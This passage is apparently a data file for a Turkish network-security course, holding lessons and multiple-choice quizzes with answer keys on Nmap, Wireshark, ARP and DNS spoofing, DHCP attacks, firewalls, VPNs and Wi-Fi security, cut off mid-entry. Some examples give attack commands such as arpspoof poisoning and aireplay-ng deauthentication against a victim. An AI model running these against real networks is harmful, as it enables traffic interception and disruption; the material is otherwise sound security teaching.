servislerin tam ad\u0131n\u0131 ve versiyon bilgisini (\xF6rn. Apache 2.4.41) tespit eder.</li><li><strong>`-O` (OS Detection):</strong> Hedef cihaz\u0131n i\u015Fletim sistemini (Linux, Windows vb.) tahmin eder.</li><li><strong>`-A` (Aggressive Scan):</strong> OS tespiti, versiyon tespiti, script taramas\u0131 ve traceroute i\u015Flemlerini tek seferde yapar.</li></ul>",example:"<h3>Komut \xD6rne\u011Fi:</h3><p>Hedefe y\xF6nelik agresif bir tarama ba\u015Flatmak ve i\u015Fletim sistemi ile servis s\xFCr\xFCmlerini \xF6\u011Frenmek i\xE7in: <code>nmap -A 192.168.1.50</code> komutu \xE7al\u0131\u015Ft\u0131r\u0131l\u0131r.</p>",questions:[{q:"Nmap taramas\u0131nda a\xE7\u0131k portlardaki servislerin versiyon bilgilerini tespit etmek i\xE7in hangi parametre kullan\u0131l\u0131r?",options:["-sS","-sV","-O","-sT"],correct:1},{q:"Hedef makinenin i\u015Fletim sistemini (OS) tespit etmek i\xE7in kullan\u0131lan Nmap parametresi hangisidir?",options:["-O","-sV","-sP","-p-"],correct:0},{q:"Nmap'te '-A' (Aggressive) parametresi a\u015Fa\u011F\u0131dakilerden hangisini ger\xE7ekle\u015Ftirmez?",options:["OS Tespiti","Servis Versiyon Tespiti","G\xFCvenlik Duvar\u0131n\u0131 Kapatma","Traceroute Analizi"],correct:2}]},{id:"ag-12",title:"Nmap Scripting Engine (NSE)",content:"<h2>Nmap Scripting Engine (NSE)</h2><p>NSE, Nmap'in en g\xFC\xE7l\xFC \xF6zelliklerinden biridir. Kullan\u0131c\u0131lar\u0131n \xF6nceden yaz\u0131lm\u0131\u015F Lua script'lerini kullanarak a\u011F taramalar\u0131n\u0131 otomatikle\u015Ftirmesini, g\xFCvenlik a\xE7\u0131klar\u0131n\u0131 ke\u015Ffetmesini ve hatta basit exploit i\u015Flemleri yapmas\u0131n\u0131 sa\u011Flar.</p><p>NSE Script Kategorileri:</p><ul><li><strong>safe:</strong> A\u011F trafi\u011Fini bozmayan, sisteme zarar vermeyen g\xFCvenli scriptler.</li><li><strong>vuln:</strong> Hedef sistemde bilinen g\xFCvenlik a\xE7\u0131klar\u0131n\u0131 (CVE'leri) kontrol eder.</li><li><strong>brute:</strong> FTP, SSH, SQL gibi servislere y\xF6nelik kaba kuvvet sald\u0131r\u0131s\u0131 yapar.</li><li><strong>exploit:</strong> G\xFCvenlik a\xE7\u0131klar\u0131n\u0131 s\xF6m\xFCrmeye \xE7al\u0131\u015F\u0131r.</li></ul>",example:"<h3>\xD6rnek Komut:</h3><p>Hedefteki SMB (Samba) servisinin bilinen a\xE7\u0131klar\u0131n\u0131 (MS17-010 EternalBlue gibi) taramak i\xE7in: <code>nmap --script vuln -p 445 192.168.1.100</code> kullan\u0131l\u0131r.</p>",questions:[{q:"Nmap script'lerini (NSE) \xE7al\u0131\u015Ft\u0131rmak i\xE7in kullan\u0131lan temel parametre hangisidir?",options:["-sS","--script","-sV","-O"],correct:1},{q:"Hedef sistemdeki bilinen a\xE7\u0131klar\u0131 (vulnerabilities) tespit etmek i\xE7in hangi NSE script kategorisi se\xE7ilmelidir?",options:["safe","vuln","brute","default"],correct:1},{q:"NSE scriptleri hangi programlama diliyle yaz\u0131lm\u0131\u015Ft\u0131r?",options:["Python","JavaScript","Lua","Bash"],correct:2}]},{id:"ag-13",title:"Wireshark ile Paket Analizine Giri\u015F",content:"<h2>Wireshark ile Paket Analizi</h2><p>Wireshark, a\u011F trafi\u011Fini canl\u0131 olarak yakalayan (sniffing) ve paket d\xFCzeyinde inceleyen en pop\xFCler a\u011F analiz arac\u0131d\u0131r.</p><p>A\u011F kartlar\u0131 varsay\u0131lan olarak sadece kendi \xFCzerlerine gelen trafi\u011Fi i\u015Fler. Wireshark ile t\xFCm a\u011F trafi\u011Fini dinlemek i\xE7in a\u011F kart\u0131n\u0131n <strong>Promiscuous Mode (Kar\u0131\u015F\u0131k Mod)</strong> konumuna getirilmesi gerekir. Bu mod aktif edildi\u011Finde kart, hedefine bak\u0131lmaks\u0131z\u0131n kablodan ge\xE7en t\xFCm paketleri yakalar.</p>",example:"<h3>Kullan\u0131m Alan\u0131:</h3><p>A\u011Fda \u015F\xFCpheli bir yava\u015Fl\u0131k veya siber sald\u0131r\u0131 \u015F\xFCphesi oldu\u011Funda, Wireshark ba\u015Flat\u0131larak a\u011Fdaki ARP yay\u0131nlar\u0131, DNS sorgular\u0131 ve TCP ba\u011Flant\u0131lar\u0131 canl\u0131 olarak izlenir.</p>",questions:[{q:"Wireshark arac\u0131n\u0131n temel i\u015Flevi a\u015Fa\u011F\u0131dakilerden hangisidir?",options:["\u015Eifre k\u0131rma","A\u011F trafi\u011Fini yakalama ve paket analizi yapma","G\xFCvenlik duvar\u0131 kurallar\u0131 yazma","DDoS sald\u0131r\u0131s\u0131 ba\u015Flatma"],correct:1},{q:"A\u011F kart\u0131n\u0131n hedefine bak\u0131lmaks\u0131z\u0131n a\u011Fdaki t\xFCm paketleri yakalamas\u0131n\u0131 sa\u011Flayan mod hangisidir?",options:["Monitor Mode","Promiscuous Mode (Kar\u0131\u015F\u0131k Mod)","Managed Mode","Ad-Hoc Mode"],correct:1},{q:"Wireshark ile yakalanan paket kay\u0131tlar\u0131n\u0131n standart dosya uzant\u0131s\u0131 hangisidir?",options:[".txt",".pcap / .pcapng",".log",".exe"],correct:1}]},{id:"ag-14",title:"Wireshark Filtreleme Teknikleri",content:'<h2>Wireshark Filtreleme ve A\u011F Trafi\u011Fi \u0130nceleme</h2><p>Wireshark ile saniyede binlerce paket yakalanabilir. Arad\u0131\u011F\u0131m\u0131z kan\u0131tlar\u0131 bulmak i\xE7in geli\u015Fmi\u015F filtreleme tekniklerini kullanmak zorunday\u0131z.</p><p>S\u0131k Kullan\u0131lan Wireshark Filtreleri:</p><ul><li>`ip.addr == 192.168.1.50`: Sadece bu IP adresine giden veya gelen paketleri g\xF6sterir.</li><li>`tcp.port == 80`: Sadece HTTP (port 80) trafi\u011Fini listeler.</li><li>`http.request.method == "POST"`: Web formlar\u0131ndan g\xF6nderilen verileri (kullan\u0131c\u0131 ad\u0131, \u015Fifre vb.) listeler.</li><li>`dns`: Sadece alan ad\u0131 \xE7\xF6z\xFCmleme paketlerini listeler.</li></ul>',example:'<h3>Uygulama:</h3><p>\u015Eifresi \xE7al\u0131nan bir kullan\u0131c\u0131n\u0131n trafi\u011Fini analiz etmek i\xE7in filtre alan\u0131na <code>http.request.method == "POST"</code> yaz\u0131larak arama yap\u0131l\u0131r. Paket i\xE7eri\u011Findeki <i>Form Item</i> k\u0131sm\u0131nda a\xE7\u0131k \u015Fifreler okunabilir.</p>',questions:[{q:"Wireshark'ta sadece 192.168.1.10 IP adresiyle ili\u015Fkili trafi\u011Fi listelemek i\xE7in hangi filtre kullan\u0131l\u0131r?",options:["ip.src == 192.168.1.10","ip.addr == 192.168.1.10","ip.dst == 192.168.1.10","host 192.168.1.10"],correct:1},{q:"Web sitelerine g\xF6nderilen POST isteklerini (\xF6rn. giri\u015F bilgileri) Wireshark'ta filtrelemek i\xE7in en uygun ifade hangisidir?",options:["http","tcp.port == 80",'http.request.method == "POST"',"post.request"],correct:2},{q:"Filtre alan\u0131na yaz\u0131lan 'dns' ifadesi neyi listeler?",options:["Sadece web sitesi trafi\u011Fini","T\xFCm UDP paketlerini","Alan ad\u0131 sorgulama ve yan\u0131t paketlerini","IP adresi olmayan paketleri"],correct:2}]},{id:"ag-15",title:"ARP Spoofing Sald\u0131r\u0131s\u0131",content:"<h2>ARP Spoofing (ARP Zehirlenmesi)</h2><p>ARP protokol\xFCn\xFCn kimlik do\u011Frulama mekanizmas\u0131 yoktur. A\u011Fa ba\u011Fl\u0131 herhangi bir cihaz, istek gelmeden de a\u011Fa sahte ARP yan\u0131tlar\u0131 (gratuitous ARP) g\xF6nderebilir.</p><p><strong>ARP Spoofing:</strong> Sald\u0131rgan\u0131n, a\u011F ge\xE7idine (Gateway) kendisini kurban cihaz olarak tan\u0131tmas\u0131; kurban cihaza ise kendisini a\u011F ge\xE7idi (Gateway) olarak tan\u0131tmas\u0131 durumudur. Bu sayede kurban\u0131n t\xFCm internet trafi\u011Fi sald\u0131rgan\u0131n bilgisayar\u0131 \xFCzerinden akar.</p>",example:"<h3>Sald\u0131r\u0131 Ad\u0131mlar\u0131:</h3><p>Sald\u0131rgan Kali Linux \xFCzerinden <code>arpspoof -i eth0 -t 192.168.1.5 192.168.1.1</code> komutunu \xE7al\u0131\u015Ft\u0131rarak kurban\u0131n (192.168.1.5) ARP tablosunu zehirler ve kendini modem gibi g\xF6sterir.</p>",questions:[{q:"ARP Spoofing sald\u0131r\u0131s\u0131n\u0131n temel nedeni nedir?",options:["ARP protokol\xFCn\xFCn \u015Fifreli olmas\u0131","ARP protokol\xFCnde kimlik do\u011Frulama (authentication) olmamas\u0131","IP adreslerinin yetersizli\u011Fi","Switch'lerin \xE7ok yava\u015F \xE7al\u0131\u015Fmas\u0131"],correct:1},{q:"ARP Spoofing sald\u0131r\u0131s\u0131 yapan bir sald\u0131rgan yerel a\u011Fda hangi konuma eri\u015Fmi\u015F olur?",options:["Domain Controller","Ortadaki Adam (Man-in-the-Middle)","D\u0131\u015F A\u011F DNS Sunucusu","Veritaban\u0131 Y\xF6neticisi"],correct:1},{q:"ARP Zehirlenmesi sald\u0131r\u0131s\u0131ndan korunmak i\xE7in yerel a\u011Fda hangi g\xFCvenlik \xF6nlemi uygulanmal\u0131d\u0131r?",options:["WPA3 \u015Eifreleme","Dinamik ARP Denetimi (Dynamic ARP Inspection - DAI)","G\xFC\xE7l\xFC Parolalar","HTTP yerine HTTPS kullanmak"],correct:1}]},{id:"ag-16",title:"Man-in-the-Middle (MITM) Sald\u0131r\u0131lar\u0131",content:"<h2>Man-in-the-Middle (Ortadaki Adam) Sald\u0131r\u0131lar\u0131</h2><p>MITM, bir sald\u0131rgan\u0131n iki cihaz (\xF6rne\u011Fin kurban bilgisayar ile internet a\u011F ge\xE7idi) aras\u0131ndaki ileti\u015Fimi gizlice dinlemesi, araya girerek veriyi okumas\u0131 veya de\u011Fi\u015Ftirmesidir.</p><p>Sald\u0131rgan araya girdikten sonra trafi\u011Fi analiz eder. E\u011Fer trafik \u015Fifrelenmemi\u015Fse (HTTP, FTP, Telnet), kurban\u0131n girdi\u011Fi \u015Fifreler, e-postalar ve ki\u015Fisel veriler a\xE7\u0131k\xE7a okunabilir. Korunman\u0131n en etkili yolu t\xFCm trafi\u011Fi u\xE7tan uca \u015Fifrelemektir (HTTPS, VPN, SSH).</p>",example:"<h3>Sald\u0131r\u0131 \xD6nleme:</h3><p>Web sitelerinde HTTPS kullan\u0131ld\u0131\u011F\u0131nda, sald\u0131rgan araya girse bile trafik \u015Fifreli (SSL/TLS) oldu\u011Fu i\xE7in verinin i\xE7eri\u011Fini okuyamaz, sadece anlams\u0131z karma\u015F\u0131k baytlar g\xF6r\xFCr.</p>",questions:[{q:"A\u015Fa\u011F\u0131dakilerden hangisi Man-in-the-Middle (MITM) sald\u0131r\u0131lar\u0131na kar\u015F\u0131 en etkili koruma y\xF6ntemidir?",options:["Antivir\xFCs kullanmak","Trafi\u011Fi u\xE7tan uca \u015Fifrelemek (HTTPS, SSL/TLS, VPN)","IP adresini gizlemek","Daha h\u0131zl\u0131 bir y\xF6nlendirici kullanmak"],correct:1},{q:"Ortadaki adam konumundaki bir sald\u0131rgan \u015Fifreli HTTPS trafi\u011Fini do\u011Frudan okuyabilir mi?",options:["Evet, t\xFCm \u015Fifreli verileri an\u0131nda okur","Hay\u0131r, veriler SSL/TLS ile \u015Fifrelendi\u011Fi i\xE7in \xE7\xF6zemez","Sadece kurban\u0131n taray\u0131c\u0131s\u0131 eskiyse okur","Sadece kablolu a\u011Flardaysa okur"],correct:1},{q:"A\u015Fa\u011F\u0131daki protokollerden hangisiyle ta\u015F\u0131nan veriler MITM sald\u0131r\u0131s\u0131nda a\xE7\u0131k metin olarak s\u0131zd\u0131r\u0131labilir?",options:["HTTPS","SFTP","HTTP","SSH"],correct:2}]},{id:"ag-17",title:"DHCP Starvation ve Rogue DHCP",content:"<h2>DHCP Starvation ve Rogue DHCP</h2><p>DHCP servisleri a\u011F g\xFCvenli\u011Finde zay\u0131f halkalardan biridir ve iki temel sald\u0131r\u0131ya maruz kalabilir:</p><p><strong>1. DHCP Starvation (A\xE7 B\u0131rakma):</strong> Sald\u0131rgan, saniyeler i\xE7inde binlerce sahte MAC adresi \xFCreterek DHCP sunucusuna istek atar ve havuzdaki t\xFCm bo\u015F IP adreslerini t\xFCketir. A\u011Fdaki yeni cihazlar IP alamaz.</p><p><strong>2. Rogue DHCP (Sahte DHCP Sunucusu):</strong> Havuz bo\u015Fald\u0131ktan sonra sald\u0131rgan a\u011Fda kendi sahte DHCP sunucusunu ba\u015Flat\u0131r. A\u011Fa yeni ba\u011Flanan cihazlara kendi sahte IP yap\u0131land\u0131rmas\u0131n\u0131 (sahte a\u011F ge\xE7idi ve sahte DNS adresi) da\u011F\u0131tarak MITM sald\u0131r\u0131s\u0131 ger\xE7ekle\u015Ftirir.</p>",example:"<h3>Sald\u0131r\u0131 Engelleme:</h3><p>Cisco switch'lerde <strong>DHCP Snooping</strong> \xF6zelli\u011Fi aktif edilerek sadece g\xFCvenilir portlardan DHCP Offer paketlerinin ge\xE7i\u015Fine izin verilir, sahte DHCP sunucular\u0131 engellenir.</p>",questions:[{q:"DHCP sunucusundaki t\xFCm bo\u015F IP adreslerini sahte isteklerle t\xFCketerek a\u011F servislerini kilitleyen sald\u0131r\u0131 hangisidir?",options:["ARP Spoofing","DHCP Starvation","DNS Poisoning","SYN Flood"],correct:1},{q:"Rogue DHCP (Sahte DHCP) sald\u0131r\u0131s\u0131n\u0131n temel amac\u0131 nedir?",options:["A\u011F h\u0131z\u0131n\u0131 art\u0131rmak","Kurbanlar\u0131 kendi kontrol\xFCndeki sahte a\u011F ge\xE7idine y\xF6nlendirip trafi\u011Fi dinlemek","\u015Eifreleri kaba kuvvetle k\u0131rmak","Web sunucusunu \xE7\xF6kertmek"],correct:1},{q:"Switch'lerde sahte DHCP sunucular\u0131n\u0131 engellemek i\xE7in hangi g\xFCvenlik \xF6zelli\u011Fi kullan\u0131lmal\u0131d\u0131r?",options:["Port Security","DHCP Snooping","VLAN Trunking","Dynamic ARP Inspection"],correct:1}]},{id:"ag-18",title:"DNS Spoofing (DNS \xD6nbellek Zehirlenmesi)",content:"<h2>DNS Spoofing (DNS Cache Poisoning)</h2><p>DNS Spoofing, kurban\u0131n DNS \xE7\xF6z\xFCmleme isteklerine sahte yan\u0131tlar vererek onu gitmek istedi\u011Fi ger\xE7ek web sitesi (\xF6rn. <code>banka.com</code>) yerine sald\u0131rgan\u0131n haz\u0131rlad\u0131\u011F\u0131 sahte bir web sitesine (phishing sayfas\u0131) y\xF6nlendirme sald\u0131r\u0131s\u0131d\u0131r.</p><p>Sald\u0131rgan yerel a\u011Fda ARP zehirlenmesi yapt\u0131ktan sonra kurban\u0131n DNS sorgular\u0131n\u0131 yakalar ve ger\xE7ek DNS sunucusundan \xF6nce sahte bir yan\u0131t paketini kurbana g\xF6nderir.</p>",example:"<h3>Analiz:</h3><p>Kurban taray\u0131c\u0131s\u0131na <code>google.com</code> yazar, bilgisayar\u0131 IP'sini sorgular. Araya giren sald\u0131rgan kurbana kendi IP'sini (\xF6rn. 192.168.1.50) d\xF6ner. Kurban\u0131n ekran\u0131nda Google g\xF6r\xFCn\xFCml\xFC sahte bir sayfa a\xE7\u0131l\u0131r.</p>",questions:[{q:"Kullan\u0131c\u0131n\u0131n alan ad\u0131 sorgular\u0131na sahte IP yan\u0131tlar\u0131 d\xF6nerek onu sahte sitelere y\xF6nlendiren sald\u0131r\u0131 t\xFCr\xFC hangisidir?",options:["ARP Spoofing","DNS Spoofing (Cache Poisoning)","MAC Flooding","DHCP Starvation"],correct:1},{q:"DNS Spoofing sald\u0131r\u0131s\u0131na u\u011Frayan bir kullan\u0131c\u0131n\u0131n taray\u0131c\u0131s\u0131nda genellikle hangi uyar\u0131 veya durum olu\u015Fur?",options:["\u0130nternet ba\u011Flant\u0131s\u0131 tamamen kopar","Girdi\u011Fi adres \xE7ubu\u011Funda SSL/TLS sertifika hatas\u0131 (G\xFCvensiz Ba\u011Flant\u0131) uyar\u0131s\u0131 \xE7\u0131kabilir","Bilgisayar\u0131 aniden yeniden ba\u015Flar","DNS sunucusu \xE7\xF6ker"],correct:1},{q:"DNS sorgular\u0131n\u0131n \u015Fifrelenmesini ve do\u011Frulanmas\u0131n\u0131 sa\u011Flayan g\xFCvenlik teknolojisi hangisidir?",options:["DNSSEC / DoH (DNS over HTTPS)","DHCP Snooping","WPA3","NAT"],correct:0}]},{id:"ag-19",title:"Firewall (G\xFCvenlik Duvar\u0131) T\xFCrleri",content:"<h2>Firewall (G\xFCvenlik Duvar\u0131) T\xFCrleri</h2><p>Firewall, a\u011Fa gelen ve a\u011Fdan giden trafi\u011Fi \xF6nceden tan\u0131mlanm\u0131\u015F g\xFCvenlik kurallar\u0131na g\xF6re denetleyen ve filtreleyen yaz\u0131l\u0131m veya donan\u0131m sistemidir.</p><p>Temel G\xFCvenlik Duvar\u0131 T\xFCrleri:</p><ul><li><strong>Paket Filtreleme (Packet Filtering):</strong> Paketlerin sadece kaynak/hedef IP ve port numaralar\u0131n\u0131 kontrol eder (Stateless). H\u0131zl\u0131d\u0131r ama i\xE7erik analizi yapamaz.</li><li><strong>Durumsal Denetim (Stateful Inspection):</strong> Ba\u011Flant\u0131n\u0131n durumunu (aktif el s\u0131k\u0131\u015Fmalar, oturum ge\xE7mi\u015Fi) takip eder. Daha g\xFCvenlidir.</li><li><strong>Yeni Nesil G\xFCvenlik Duvar\u0131 (NGFW):</strong> Uygulama katman\u0131ndaki veriyi de inceler (Deep Packet Inspection), kullan\u0131c\u0131 rollerini tan\u0131r ve entegre IPS bar\u0131nd\u0131r\u0131r.</li></ul>",example:"<h3>Kural Yap\u0131s\u0131:</h3><p>Bir firewall kural\u0131: <i>'D\u0131\u015F a\u011Fdan (WAN) i\xE7 a\u011Fdaki (LAN) Port 22'ye (SSH) gelen t\xFCm ba\u011Flant\u0131lar\u0131 ENGELLE (DENY)'</i> \u015Feklinde tan\u0131mlanarak d\u0131\u015Far\u0131dan SSH s\u0131zmalar\u0131 \xF6nlenir.</p>",questions:[{q:"Ba\u011Flant\u0131n\u0131n durumunu ve aktif oturum tablolar\u0131n\u0131 takip ederek filtreleme yapan firewall t\xFCr\xFC hangisidir?",options:["Stateless Packet Filtering","Stateful Inspection (Durumsal Denetim)","Proxy Firewall","Simple Hub"],correct:1},{q:"Derin Paket \u0130ncelemesi (DPI) yapabilen ve uygulama katman\u0131ndaki trafi\u011Fi s\xFCzebilen modern firewall s\u0131n\u0131f\u0131 hangisidir?",options:["Paket Filtreleyici","NGFW (Next Generation Firewall)","NAT Cihaz\u0131","Stateless Firewall"],correct:1},{q:"Firewall kurallar\u0131nda genellikle varsay\u0131lan yakla\u015F\u0131m (Default Policy) ne olmal\u0131d\u0131r?",options:["Her \u015Feye izin ver, \u015F\xFCphelileri engelle","Her \u015Feyi engelle, sadece gerekli olanlara izin ver (Implicit Deny)","T\xFCm portlar\u0131 a\xE7\u0131k b\u0131rak","Sadece IP bazl\u0131 filtreleme yap"],correct:1}]},{id:"ag-20",title:"IDS ve IPS Sistemleri",content:"<h2>IDS ve IPS Sistemleri</h2><p>IDS ve IPS, a\u011Fdaki zararl\u0131 aktiviteleri ve siber sald\u0131r\u0131lar\u0131 tespit etmek i\xE7in kullan\u0131lan g\xFCvenlik teknolojileridir.</p><p><strong>IDS (Intrusion Detection System - Sald\u0131r\u0131 Tespit Sistemi):</strong> A\u011F trafi\u011Fini kopyalayarak pasif olarak izler. \u015E\xFCpheli bir imza veya anormal hareket g\xF6rd\xFC\u011F\xFCnde sadece <strong>alarm \xFCretir</strong>, trafi\u011Fi engellemez.</p><p><strong>IPS (Intrusion Prevention System - Sald\u0131r\u0131 Engelleme Sistemi):</strong> A\u011F hatt\u0131n\u0131n \xFCzerinde (inline) aktif olarak \xE7al\u0131\u015F\u0131r. Sald\u0131r\u0131y\u0131 tespit etti\u011Fi anda paketleri drop ederek sald\u0131r\u0131y\u0131 <strong>an\u0131nda engeller</strong>.</p>",example:"<h3>\xC7al\u0131\u015Fma Y\xF6ntemleri:</h3><p>\u0130ki y\xF6ntem kullan\u0131l\u0131r: <strong>\u0130mza Tabanl\u0131 (Signature-based)</strong> (bilinen vir\xFCs/sald\u0131r\u0131 kal\u0131plar\u0131n\u0131 arar) ve <strong>Anomali Tabanl\u0131 (Anomaly-based)</strong> (normal a\u011F davran\u0131\u015F\u0131n\u0131 \xF6\u011Frenip bunun d\u0131\u015F\u0131ndaki sapmalar\u0131 raporlar).</p>",questions:[{q:"IDS ve IPS aras\u0131ndaki en temel fark hangisidir?",options:["IDS daha h\u0131zl\u0131d\u0131r","IDS sadece tespit edip alarm \xFCretir, IPS ise aktif olarak engeller","IPS sadece kablosuz a\u011Flarda \xE7al\u0131\u015F\u0131r","IDS i\u015Fletim sistemlerini tespit eder"],correct:1},{q:"A\u011Fda daha \xF6nce hi\xE7 g\xF6r\xFClmemi\u015F (Zero-day) bir sald\u0131r\u0131y\u0131 tespit etmek i\xE7in hangi IDS/IPS analiz y\xF6ntemi daha uygundur?",options:["\u0130mza Tabanl\u0131 (Signature-based)","Anomali Tabanl\u0131 (Anomaly-based)","Kaba Kuvvet Tabanl\u0131","Port Tabanl\u0131"],correct:1},{q:"A\u011F trafi\u011Finin \xFCzerinde do\u011Frudan (inline) durarak paketleri bloke edebilen sistem hangisidir?",options:["IDS","Honeypot","IPS","Wireshark"],correct:2}]},{id:"ag-21",title:"VPN Teknolojileri",content:"<h2>VPN (Virtual Private Network) Teknolojileri</h2><p>VPN, g\xFCvensiz veya halka a\xE7\u0131k a\u011Flar \xFCzerinden (\xF6rne\u011Fin internet) \u015Fifreli ve g\xFCvenli t\xFCneller olu\u015Fturarak \xF6zel a\u011Flara uzaktan eri\u015Fim sa\u011Flayan teknolojidir.</p><p>Temel VPN Protokolleri:</p><ul><li><strong>IPsec:</strong> A\u011F katman\u0131nda \u015Fifreleme sunar. \xC7ok g\xFCvenlidir ve \u015Firketler aras\u0131 (Site-to-Site) ba\u011Flant\u0131larda s\u0131k kullan\u0131l\u0131r.</li><li><strong>OpenVPN:</strong> SSL/TLS tabanl\u0131, a\xE7\u0131k kaynakl\u0131, esnek ve g\xFCvenli bir protokold\xFCr. TCP veya UDP \xFCzerinden \xE7al\u0131\u015Fabilir.</li><li><strong>WireGuard:</strong> Son derece hafif, modern, h\u0131zl\u0131 ve y\xFCksek kriptografik g\xFCvenli\u011Fe sahip yeni nesil VPN protokol\xFCd\xFCr.</li></ul>",example:"<h3>Kullan\u0131m Senaryosu:</h3><p>Bir \xE7al\u0131\u015Fan evindeki g\xFCvensiz internet hatt\u0131 \xFCzerinden \u015Firket kaynaklar\u0131na eri\u015Firken VPN ba\u015Flat\u0131r. B\xF6ylece evdeki internet servis sa\u011Flay\u0131c\u0131 veya olas\u0131 bir MITM sald\u0131rgan\u0131 \u015Firkete giden verileri \u015Fifreli oldu\u011Fu i\xE7in okuyamaz.</p>",questions:[{q:"VPN (Sanal \xD6zel A\u011F) teknolojisinin sa\u011Flad\u0131\u011F\u0131 en temel g\xFCvenlik unsuru hangisidir?",options:["Bilgisayar\u0131n h\u0131z\u0131n\u0131 art\u0131rmak","Veri trafi\u011Fini \u015Fifreleyerek gizlilik ve b\xFCt\xFCnl\xFCk sa\u011Flamak","A\xE7\u0131k portlar\u0131 kapatmak","Vir\xFCsleri temizlemek"],correct:1},{q:"SSL/TLS tabanl\u0131, a\xE7\u0131k kaynak kodlu ve en yayg\u0131n kullan\u0131lan VPN protokollerinden biri hangisidir?",options:["Telnet","OpenVPN","FTP","WEP"],correct:1},{q:"Yeni nesil, son derece h\u0131zl\u0131 ve hafif olan modern VPN protokol\xFC hangisidir?",options:["PPTP","L2TP","WireGuard","IPsec"],correct:2}]},{id:"ag-22",title:"Wi-Fi \u015Eifreleme Protokolleri",content:"<h2>Wi-Fi \u015Eifreleme Protokolleri (WEP, WPA2, WPA3)</h2><p>Kablosuz a\u011Flar havadan yay\u0131n yapt\u0131\u011F\u0131 i\xE7in verinin \u015Fifrelenmesi \u015Fartt\u0131r. Y\u0131llar i\xE7inde farkl\u0131 \u015Fifreleme protokolleri geli\u015Ftirilmi\u015Ftir:</p><ul><li><strong>WEP (Wired Equivalent Privacy):</strong> En eski ve en zay\u0131f protokold\xFCr. RC4 algoritmas\u0131ndaki zay\u0131fl\u0131k nedeniyle dakikalar i\xE7inde \u015Fifresi k\u0131r\u0131labilir. Kesinlikle kullan\u0131lmamal\u0131d\u0131r.</li><li><strong>WPA2:</strong> G\xFC\xE7l\xFC <strong>AES (Advanced Encryption Standard)</strong> \u015Fifreleme algoritmas\u0131n\u0131 kullan\u0131r. G\xFCn\xFCm\xFCzde en yayg\u0131n olan\u0131d\u0131r ancak KRACK ve kaba kuvvet sald\u0131r\u0131lar\u0131na kar\u015F\u0131 baz\u0131 a\xE7\u0131klar\u0131 vard\u0131r.</li><li><strong>WPA3:</strong> En g\xFCncel ve g\xFCvenli protokold\xFCr. E\u015F zamanl\u0131 kimlik do\u011Frulama (SAE) kullanarak s\xF6zl\xFCk sald\u0131r\u0131lar\u0131n\u0131 engeller ve iletim g\xFCvenli\u011Fi sunar.</li></ul>",example:"<h3>Sald\u0131r\u0131 Analizi:</h3><p>WPA2 a\u011Flarda el s\u0131k\u0131\u015Fma (handshake) paketleri havadan yakalanarak bilgisayarda \xE7evrimd\u0131\u015F\u0131 (offline) s\xF6zl\xFCk sald\u0131r\u0131s\u0131yla k\u0131r\u0131lmaya \xE7al\u0131\u015F\u0131labilir. WPA3'te ise bu kaba kuvvet sald\u0131r\u0131lar\u0131 teknik olarak engellenmi\u015Ftir.</p>",questions:[{q:"RC4 algoritmas\u0131ndaki zay\u0131fl\u0131klar nedeniyle saniyeler i\xE7inde \u015Fifresi k\u0131r\u0131labilen, g\xFCn\xFCm\xFCzde kullan\u0131lmamas\u0131 gereken eski kablosuz \u015Fifreleme protokol\xFC hangisidir?",options:["WPA2","WPA3","WEP","AES"],correct:2},{q:"WPA2 protokol\xFC \u015Fifreleme standard\u0131 olarak hangi g\xFC\xE7l\xFC algoritmay\u0131 temel al\u0131r?",options:["RC4","MD5","AES","DES"],correct:2},{q:"WPA3 protokol\xFCn\xFCn WPA2'ye g\xF6re getirdi\u011Fi en b\xFCy\xFCk g\xFCvenlik iyile\u015Ftirmesi nedir?",options:["Daha y\xFCksek Wi-Fi h\u0131z\u0131 sunmas\u0131","\xC7evrimd\u0131\u015F\u0131 \u015Fifre k\u0131rma (s\xF6zl\xFCk/brute-force) sald\u0131r\u0131lar\u0131n\u0131 engellemesi","Sadece telefonlarda \xE7al\u0131\u015Fmas\u0131","\u015Eifresiz ba\u011Flant\u0131 sunmas\u0131"],correct:1}]},{id:"ag-23",title:"Deauth (Ba\u011Flant\u0131 Kesme) Sald\u0131r\u0131lar\u0131",content:"<h2>Deauth (Deauthentication) Sald\u0131r\u0131lar\u0131</h2><p>Kablosuz a\u011Flarda (802.11), cihazlar\u0131n eri\u015Fim noktas\u0131ndan (Access Point) ba\u011Flant\u0131s\u0131n\u0131 kesmek i\xE7in kullan\u0131lan \xF6zel y\xF6netim paketleri (Deauth Frames) vard\u0131r. Bu paketler \u015Fifrelenmemi\u015F olarak havadan g\xF6nderilir.</p><p>Bir sald\u0131rgan, hedef cihaz\u0131n MAC adresini taklit ederek eri\u015Fim noktas\u0131na sahte ba\u011Flant\u0131 kesme paketi g\xF6nderir veya tam tersini yapar. Sonu\xE7 olarak kurban\u0131n Wi-Fi ba\u011Flant\u0131s\u0131 an\u0131nda kopar. Sald\u0131rgan bu y\xF6ntemi <strong>WPA2 el s\u0131k\u0131\u015Fma (handshake)</strong> paketini yakalamak veya kullan\u0131c\u0131y\u0131 sahte bir Wi-Fi a\u011F\u0131na (Evil Twin) y\xF6nlendirmek i\xE7in kullan\u0131r.</p>",example:"<h3>Kali Linux Komutu:</h3><p>Sald\u0131rgan <code>aireplay-ng --deauth 10 -a [AP_MAC] -c [KURBAN_MAC] wlan0mon</code> komutunu \xE7al\u0131\u015Ft\u0131rarak kurban\u0131n Wi-Fi ba\u011Flant\u0131s\u0131n\u0131 keser.</p>",questions:[{q:"Deauth sald\u0131r\u0131s\u0131n\u0131n temel \xE7al\u0131\u015Fma mekanizmas\u0131 nedir?",options:["Wi-Fi \u015Fifresini tahmin etmek","Wi-Fi y\xF6netim paketlerinin (management frames) \u015Fifresiz olmas\u0131n\u0131 suistimal ederek sahte ba\u011Flant\u0131 kesme istekleri g\xF6ndermek","Eri\u015Fim noktas\u0131n\u0131n elektri\u011Fini kesmek","IP adresini \xE7almak"],correct:1},{q:"Sald\u0131rganlar neden bir Wi-Fi a\u011F\u0131na Deauth sald\u0131r\u0131s\u0131 d\xFCzenler?",options:["Modemi \xE7\xF6kertip bozmak i\xE7in","Kurban\u0131n ba\u011Flant\u0131s\u0131 koptu\u011Funda yeniden ba\u011Flan\u0131rken WPA2 el s\u0131k\u0131\u015Fma (handshake) paketini yakalamak i\xE7in","\u0130nterneti h\u0131zland\u0131rmak i\xE7in","IP \xE7ak\u0131\u015Fmas\u0131 yaratmak i\xE7in"],correct:1},{q:"Deauth sald\u0131r\u0131lar\u0131n\u0131 engellemek i\xE7in geli\u015Ftirilen kablosuz a\u011F standard\u0131 hangisidir?",options:["802.3 Ethernet","802.11w (Korumal\u0131 